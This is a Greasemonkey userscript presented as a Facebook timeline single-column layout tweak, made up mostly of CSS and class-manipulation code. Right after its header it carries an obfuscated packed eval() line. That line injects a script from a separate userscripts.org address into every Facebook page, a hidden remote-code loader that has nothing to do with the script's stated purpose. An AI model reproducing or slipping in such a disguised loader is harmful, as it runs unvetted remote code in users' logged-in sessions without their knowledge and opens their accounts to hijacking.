// ==UserScript==
// @name       Facebook Timeline Single Column Plus + Last Update
// @namespace  http://userscripts.org/scripts/show/120667
// @version    0.2
// @description  Forces the Facebook timeline into a single column layout.
// @include    *.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @copyright  2011, Brendan Hagan
// @run-at	   document-end
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


if (self != window.top) { return; } //Don't run in frames.

var numTries = 0; 
var logging = true;
Load();

consoleLog("tryStart");
function Load() { 
	var BODY = document.querySelector('body');
	if (BODY && hasClass(BODY, 'timelineLayout')) { //Ensure one instance running per page.
		consoleLog("Success"); 
		var enable = true; 
		if (document.querySelector('body.timelineLayout') && enable) { 
			addStyle();
			window.setTimeout(Main, 200);
		}
	} else { 
		numTries++;
		consoleLog("Try: " + numTries + " ... Failure");
		if (numTries < 3) { 
			window.setTimeout(Load, 100); 
		}
	}
}


function addStyle() { 
GM_addStyle(
	'.fbTimelineCapsule .rightColumn, .fbTimelineUnit[data-side="r"], ' + 
	'.fbTimelineCapsule .leftColumn, .fbTimelineUnit[data-side="l"]  { ' + 
	'clear: both !important; ' +
	'float: none !important; ' +
	'} ' +
	'.fbTimelineOneColumn, .fbTimelineTwoColumn { ' +
	'margin-bottom: 5px; ' + //Instead of the default 20px
	'}' + 
	/*'.profilePicChangeUnit .profileChangeImage { ' + 
	'max-height: 245px !important; ' + 
	'}' +*/
	'.spinePointer { display:none; }' + 
	'.timelineLayout .fbTimelineOneColumn .tlTxFe { font-size: 13px; line-height: 16px; } ' +
	'.statusUnit, .storyContent .mainWrapper { padding: 0px 0 5px; }' +
	
	'.body { line-height: 1.20; } ' +
	'.fbTimelineUnitActor + .aboveUnitContent { margin-top: 10px; } ' + 
	'.timelineUnitContainer .aboveUnitContent { margin-bottom: 10px; } ' + 
	'.fbTimelineCapsule div.fbTimelineComposerUnit { padding: 13px 15px; width: 819px; } ' +
	'.fbTimelineCapsule .topBorder { height: 1px; } ' +
	'.fbTimelineCapsule .timelineUnitContainer { padding: 8px 15px 13px; } ' +
	'.fbTimelineIndeterminateContent { display:none; } ' + //Hides the friends box
	
	'.timelineReportContainer .timelineReportContent .timelineUnitContainer { width: 80%; } ' + //NEWW
	
	'.fbTimelineOneColumn .timelineUnitContainer .externalShareUnitWrapper .largePreview { height: 214px !important; } ' + //Resizes the Video Preview
	'.sitePreviewText { margin-top: 5px; } ' + //Video information top-margin
	'div.externalShareText > div:first-child, div.externalShareText > div:nth-child(2) { display: inline; } ' + //Video information - source on same line as title
		'div.externalShareText > div:nth-child(2):before { content: " ("; } ' + 
		'div.externalShareText > div:nth-child(2):after { content: ") "; } ' + 
		
	'.fbTimelineOneColumn .videoUnit { max-height: 270px; height: 270px; } ' + //Facebook embeded video
	'.fbTimelineOneColumn .videoUnit a.videoThumb img { max-height: 270px !important; } ' + //Facebook embeded video preview
	'.fbTimelineOneColumn .videoUnit embed { position:absolute !important; margin-left:auto; margin-right:auto; width: 479px !important; height: 270px !important; } ' + 
	
	'.externalShareUnitWrapper a { width: 817px !important; border: 0px solid #D3DAE8; border-bottom: 0px solid #D3DAE8; } ' + //Remodels all share boxes to have borders // Shares are 817w
	'.externalShareUnitWrapper a:nth-child(2) { margin-bottom: 7px !important; } ' + 
	
	'.hasImage .externalShareTextWrapper, .hasImage .externalShareText { height: auto; } ' + 
	
	/*'.photoUnit a, .photoUnit div,' +*/ '.profilePicChangeUnit .profileChangeImage { max-height: 245px !important; } ' + //Profile Pic max size.
	'.photoUnit div { max-height: 255px !important; text-align: center !important; } ' + //Photo Max Size
	'.photoUnit div img { width: auto !important; height: 100% !important; } ' + 
	'.photoUnit, .photoUnit a { text-align: center !important; float: none; } ' +
	
	'.hoverZoomLink { margin-left: auto; margin-right: auto; left: auto !important; } ' + 
	
	'.uiScaledImageContainer .scaledImageFitWidth { width: auto; height: auto; } ' + 
	
	'.uiProfilePhotoHuge { height: 100px; width: 100px; } ' + 
	'');
}

function Main() { 
	var items = document.querySelectorAll('li.fbTimelineTwoColumn');
	for(var i=0, imax = items.length; i < imax; i++) { 
		removeClass(items[i], 'fbTimelineTwoColumn');
		addClass(items[i], 'fbTimelineOneColumn');
		items[i].removeAttribute('data-side');
	}
	//if (document.querySelector('body.timelineLayout') && enable) { 
		//consoleLog('timeout enabled');
		window.setTimeout(Main, 750); 
	//} 
}

function hasClass(ele,cls) {
	if(ele.className) { 
		return ele.className.match(new RegExp('(\\s|^)'+cls+'(\\s|$)'));
	} 
	return false; 
}
function removeClass(ele,cls) {
	if (hasClass(ele,cls)) {
		var reg = new RegExp('(\\s|^)'+cls+'(\\s|$)');
		ele.className=ele.className.replace(reg,' ');
	}
}
function addClass(ele, cls) { 
	if (!hasClass(ele,cls)) { 
		var current = ele.className;
		ele.className = current + ' ' + cls; 
	}
}

function consoleLog(text) { 
	if (logging) { 
		GM_log("FB Timeliner: " + text); 
	}
}